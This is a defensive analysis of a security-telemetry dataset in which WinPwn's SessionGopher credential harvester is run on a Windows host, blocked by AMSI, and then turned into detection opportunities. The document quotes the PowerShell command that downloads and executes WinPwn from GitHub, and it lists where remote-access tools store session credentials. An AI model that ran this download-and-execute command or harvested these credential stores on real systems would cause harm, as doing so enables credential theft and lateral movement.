# T1552.001-11: Credentials In Files — WinPwn SessionGopher

## Technique Context

T1552.001 (Credentials in Files) encompasses harvesting credentials from application session storage files. SessionGopher, originally developed by FireEye and integrated into WinPwn, extracts saved session information from popular remote access tools: PuTTY (sessions in `HKCU\Software\SimonTatham\PuTTY\Sessions`), WinSCP (sessions in `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` and encrypted password files), FileZilla (credentials in `%APPDATA%\FileZilla\sitemanager.xml`), SuperPuTTY, and Remote Desktop Protocol (`.rdp` files). These tools frequently store hostnames, usernames, and in some cases passwords or authentication tokens that persist on workstations used for system administration.

The value of this technique is asymmetric: a single workstation belonging to a system administrator may contain saved sessions to dozens of servers, making SessionGopher a force-multiplier for lateral movement credential collection. This is different from the filesystem-sweep approach of `sensitivefiles` or `passhunt` — SessionGopher specifically targets structured session storage formats that contain authentication material in a predictable location.

Like all WinPwn tests in this series, the script is fetched from GitHub at runtime. AMSI blocked execution despite Defender being disabled.

## What This Dataset Contains

The dataset spans approximately twelve seconds of telemetry (2026-03-17T17:18:35Z–17:18:47Z) across four log sources, with 156 total events.

**Security EID 4688 — four process creates:**
1. `whoami.exe` (PID 0x3a74) — ART pre-check
2. Attack `powershell.exe` child (PID 0x4760):
   ```
   "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
   sessionGopher -noninteractive -consoleoutput}
   ```
3. `whoami.exe` (PID 0x437c) — intermediate check
4. Post-cleanup `powershell.exe` (PID 0x3880)

**Sysmon EID breakdown — 38 events: 23 EID 7, 4 EID 1, 4 EID 10, 3 EID 17, 2 EID 11, 1 EID 3, 1 EID 22:**

- **EID 22 (DNS Query)**: `raw.githubusercontent.com` resolved to all four GitHub CDN IPs.
- **EID 3 (Network Connection)**: Outbound TCP from the attack `powershell.exe` to the GitHub CDN — the download completed.
- **EID 17 (Pipe Create)**: Three named pipe creation events (one more than most other WinPwn tests at 2), suggesting the attack `powershell.exe` child initialized slightly further into the PowerShell runtime before AMSI terminated it. The pipe names follow the standard PowerShell host console pattern: `\PSHost.{timestamp}.{pid}.DefaultAppDomain.powershell`.
- **EID 7 (Image Load)**: 23 events — higher than the 8-17 range seen in other WinPwn tests. The extra DLL loads reflect a second complete PowerShell session starting (the cleanup `powershell.exe`) as well as any additional runtime components the attack child loaded before AMSI fired.
- **EID 10 (Process Access)**: Four events, one more than most other WinPwn tests, reflecting the four Security EID 4688 process create events (two child processes instead of the typical three).

**PowerShell — 112 events: 109 EID 4104, 2 EID 4103, 1 EID 4100:**
The EID 4100 block records `ScriptContainedMaliciousContent`. The EID 4103 module log confirms `New-Object net.webclient` execution.

**Application — 2 EID 15 events:**
Defender state-machine events.

## What This Dataset Does Not Contain

SessionGopher's actual execution — registry key queries for PuTTY sessions, WinSCP encrypted password decoding, FileZilla XML parsing, and RDP file enumeration — never occurred. AMSI blocked WinPwn before the `sessionGopher` function was defined or called. There are no registry access events (object access auditing is not enabled on this host), no file reads of session storage paths, and no credential content.

The slightly elevated Sysmon event counts (38 events vs 29 for T1552.001-7) are within the normal variation across the WinPwn test series and do not indicate any SessionGopher activity. They reflect the cleanup PowerShell session running in overlap with the attack session, plus PowerShell pipe initialization differences.

## Assessment

This dataset captures the SessionGopher invocation attempt with the same outcome as the other WinPwn tests: AMSI block, no technique execution. The notable contextual difference is SessionGopher's target: while `sensitivefiles` and `passhunt` hunt the local filesystem generically, SessionGopher specifically extracts structured session authentication data from known remote access tool storage locations. In a real attacker scenario, this would be the highest-value single-target tool in the WinPwn suite for environments where administrators store saved SSH or RDP sessions. For defenders, the registry paths that SessionGopher would access — particularly `HKCU\Software\SimonTatham\PuTTY\Sessions` and `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` — can be watched via object access auditing (if enabled) or Sysmon registry event rules to catch manual SessionGopher execution even when AMSI is bypassed. The EID 4688 and EID 4104 command line records provide the pre-execution detection opportunity present in this dataset.

## Detection Opportunities Present in This Data

1. Security EID 4688 command line containing `sessionGopher` — a unique, tool-specific identifier.

2. PowerShell EID 4104 containing `sessionGopher` combined with a GitHub download URL — the combination of tool name and fileless delivery in a single script block is high confidence.

3. Sysmon EID 1 for `powershell.exe` tagged `T1059.001` followed within 2-3 seconds by EID 22 DNS query to `raw.githubusercontent.com` from the same process GUID — this is the consistent multi-event pattern across all WinPwn tests that can serve as a behavioral cluster rule.

4. In environments where object access auditing is enabled: Security EID 4663 for access to `HKCU\Software\SimonTatham\PuTTY\Sessions` or `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` from `powershell.exe` — if SessionGopher ever bypasses AMSI, these registry paths are its direct targets and can be watched independently.

5. PowerShell EID 4103 recording `New-Object net.webclient` immediately before an EID 4100 block — this two-event sequence documents a complete download-block chain within the module log.

6. Sysmon EID 3 from `powershell.exe` to the GitHub CDN IP range (`185.199.108-111.133`) on port 443 — any of the four CDN IPs is equally valid as an indicator since the DNS round-robin rotates among them.
